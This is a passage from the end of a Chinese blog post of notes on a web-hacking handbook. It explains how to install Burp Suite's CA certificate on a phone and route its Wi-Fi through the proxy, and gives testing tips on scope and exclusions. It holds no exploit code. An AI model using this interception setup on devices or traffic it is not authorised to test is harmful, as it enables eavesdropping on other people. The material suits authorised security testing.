<li>Bind to address 选择 All interfaces</li>
<li>保存</li>
</ul>
<h3 id="手机端证书安装"><a href="#手机端证书安装" class="headerlink" title="手机端证书安装"></a>手机端证书安装</h3><ul>
<li>导出证书</li>
<li>使用 openssl 将证书转换为 crt 格式，openssl x509 -in mycert.der -inform DER -out mycert.pem</li>
<li>将证书拷贝到手机上（例如用微信）</li>
<li>安装证书（微信收到证书文件后，点击，用其他应用打开，会提示安装证书）</li>
</ul>
<h3 id="手机端设置代理"><a href="#手机端设置代理" class="headerlink" title="手机端设置代理"></a>手机端设置代理</h3><ul>
<li>编辑 wifi 属性</li>
<li>展开高级选项</li>
<li>将代理设置为手动</li>
<li>填写局域网已安装 burp 电脑的 IP 地址和监听端口，保存</li>
</ul>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><ul>
<li>手机端：使用浏览上网</li>
<li>电脑端：查看 burp，确认可拦截网络连接</li>
</ul>
<h1 id="23-经验总结"><a href="#23-经验总结" class="headerlink" title="23. 经验总结"></a>23. 经验总结</h1><ul>
<li>启用 Following Redirections：菜单栏 -> Repeater -> Following Redirections；</li>
<li>添加目标域名：Target -> Scope，可直接手工输入（静态域名或者正则匹配），也可在 Site map 右键点击目标域名，Add to scope；</li>
<li>添加 Exclude 域名：该功能同样重要，这样可以避免让 Burp 尝试去触发某些危险动作，如 logout, reset 等会中断测试流程的动作；</li>
<li>关键功能：手工浏览被动抓取、爬虫主要抓取、自动化扫描、自定义自动化攻击、手动攻击、生成虚拟数据、数据编码；</li>
<li></li>
</ul>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E8%BD%AF%E4%BB%B6/" class="category-chain-item">软件</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E8%BD%AF%E4%BB%B6/" class="print-no-link">#软件</a>
      
        <a href="/tags/%E5%AE%89%E5%85%A8/" class="print-no-link">#安全</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>黑客攻防技术宝典</div>
      <div>http://example.com/2020/12/05/黑客攻防技术宝典/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>ccw</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2020年12月5日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/01/17/scons%20%E7%94%A8%E6%B3%95/" title="scons 用法">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">scons 用法</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/11/12/Nginx%20%E9%85%8D%E7%BD%AE/" title="Nginx 常用配置">
                        <span class="hidden-mobile">Nginx 常用配置</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
